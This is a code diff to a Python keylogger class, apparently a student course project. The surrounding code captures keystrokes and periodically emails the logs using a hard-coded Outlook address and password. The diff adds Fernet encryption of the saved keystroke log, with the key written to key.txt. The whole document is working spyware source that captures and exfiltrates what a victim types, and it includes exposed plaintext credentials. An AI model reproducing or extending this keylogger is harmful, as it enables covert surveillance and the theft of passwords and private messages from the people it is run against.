@@ -7,10 +7,15 @@ from threading import Timer
 from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+from cryptography.fernet import Fernet
 
 SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
 EMAIL_ADDRESS = "cs455group3@outlook.com"
 EMAIL_PASSWORD = "group3cs455"
+KEY = Fernet.generate_key()
+
+with open('key.txt', 'wb') as f:
+    f.write(KEY)
 
 class Keylogger:
     def __init__(self, interval, report_method="file"):
@@ -59,7 +64,14 @@ class Keylogger:
             # write the keylogs to the file
             print(self.log, file=f)
         print(f"[+] Saved {self.filename}.txt")
-
+    def encrypt(self):
+        """ This method encrypts the log file using Fernet encryption. """
+        fernet = Fernet(KEY)
+        with open(f"{self.filename}.txt", "rb") as f:
+          text = f.read()
+        ciphertext = fernet.encrypt(text)
+        with open(f"{self.filename}.txt", "wb") as f:
+          f.write(ciphertext)
     def prepare_mail(self, message):
         """Utility function to construct a MIMEMultipart from a text
         It creates an HTML version as well as text version
@@ -106,6 +118,7 @@ class Keylogger:
                 self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
             elif self.report_method == "file":
                 self.report_to_file()
+                self.encrypt()
             # if you don't want to print in the console, comment below line
             print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
